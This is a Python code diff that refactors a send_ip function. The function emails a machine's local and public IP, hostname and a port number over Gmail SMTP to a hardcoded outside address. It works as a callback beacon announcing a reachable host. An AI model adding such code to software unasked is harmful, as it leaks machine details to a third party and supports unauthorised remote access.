@@ -1,8 +1,8 @@
+import warnings
 import netifaces
 import smtplib
 import socket
 from audit.core.environment import Environment
-
 
 
 # return local wifi interface ip and device name
@@ -20,7 +20,10 @@ def send_ip(port):
     sent_from = gmail_user
     to = ['reaperanalyzer@gmail.com']
     subject = 'IP'
-    body = "Local IP: " + Environment().private_ip + " Public IP: " + Environment().public_ip + "\nMachine: " + socket.gethostname() + "\nPort: " + str(port)
+    body = "Local IP: " + Environment().private_ip \
+           + " Public IP: " + Environment().public_ip \
+           + "\nMachine: " + socket.gethostname() \
+           + "\nPort: " + str(port)
     email_text = """From: %s\nTo: %s\nSubject: %s\n\n%s
     """ % (sent_from, ", ".join(to), subject, body)
     try:
@@ -29,5 +32,5 @@ def send_ip(port):
         server.login(gmail_user, gmail_password)
         server.sendmail(sent_from, to, email_text)
         server.close()
-    except:
-        print('Something went wrong...')
+    except Exception as e:
+        warnings.warn(str(e))
